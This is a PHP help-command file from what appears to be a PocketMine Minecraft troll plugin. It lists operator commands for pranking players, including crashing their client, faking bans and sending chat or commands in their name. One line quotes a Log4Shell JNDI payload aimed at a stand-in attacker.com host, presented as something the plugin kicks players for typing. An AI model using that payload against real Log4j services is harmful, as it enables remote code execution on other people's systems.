<?php
declare(strict_types=1);

namespace LMAO\command\args;

use pocketmine\command\CommandSender;

class HelpArgs extends BaseArgs{

	public function handle(CommandSender $sender, array $args) : void{
		$sender->sendMessage("Module List:");
		$sender->sendMessage("/lmao toggle: Toggle troll feature (not use command to execute)");
		$sender->sendMessage("Log4j CVE-2021-44228: kick player when they chat a thing like <$ {jndi:ldap://attacker.com/reference}>");
		$sender->sendMessage("Command List:");
		$sender->sendMessage("/lmao alone <player>: Hides every player for the victim");
		$sender->sendMessage("/lmao bolt <player>: The victim is really feeling the wrath of the God of lightning!");
		$sender->sendMessage("/lmao boom <player>: 	Blow up your frenemies!!");
		$sender->sendMessage("/lmao burn <player> <seconds>: Burn !!!");
		$sender->sendMessage("/lmao chat <player> <message>: Sends a chat message or run a command on behalf of the victim");
		$sender->sendMessage("/lmao clumsy <player>: Careful! The victim might just drop something");
		$sender->sendMessage("/lmao crash <player>: Crashes the victims minecraft");
		$sender->sendMessage("/lmao drunk <player>: Drank too much... feeling nauseous");
		$sender->sendMessage("/lmao fakeban <player>: Are you sure you got banned?");
		$sender->sendMessage("/lmao fakedeop <player>: Sends a deop message to the victim. They are not deopped...");
		$sender->sendMessage("/lmao fakelag <player>: Makes the victim experience fake lag! Doesn't affect the server...");
		$sender->sendMessage("/lmao fakeop <player>: Sends an op message to the victim. They are not opped...");
		$sender->sendMessage("/lmao flip <player>: Flip the victim 180 degrees");
		$sender->sendMessage("/lmao freefall <player>: Damn! This hole is deep, I have been falling forever!");
		$sender->sendMessage("/lmao garble <player>: The victim's messages will stop making sense");
		$sender->sendMessage("/lmao help: List troll feature");
		$sender->sendMessage("/lmao launch <player>: 3... 2... 1... LIFTOFF !!!!");
		$sender->sendMessage("/lmao nomine <player> <seconds>: Oh cant mine? Probably lag...");
		$sender->sendMessage("/lmao nopick <player> <seconds>: Prevents the player from picking up items");
		$sender->sendMessage("/lmao noplace <player> <seconds>: Oh cant place? Probably lag...");
		$sender->sendMessage("/lmao push <player>: An uncontrolled flight");
		$sender->sendMessage("/lmao shuffle <player>: Shuffle victim's Inventory");
		$sender->sendMessage("/lmao spam <player>: Spams the victim's chat in enchantment table language... see if you can decipher it");
		$sender->sendMessage("/lmao spin <player> <speed>: You spin me right round babe right round ...");
		$sender->sendMessage("/lmao void <player>: Journey to the center of the Earth, or in this case the void...");
		$sender->sendMessage("/lmao lookrandom <player>: Lets the victim look in a random direction");
		$sender->sendMessage("/lmao drop <player>: Drop item in player hand.");
		$sender->sendMessage("/lmao rickroll <player>: Never Gonna Give You Up... Never Gonna Let You Down...");
		$sender->sendMessage("/lmao superidol <player>: Super Idol的笑容...");
	}
}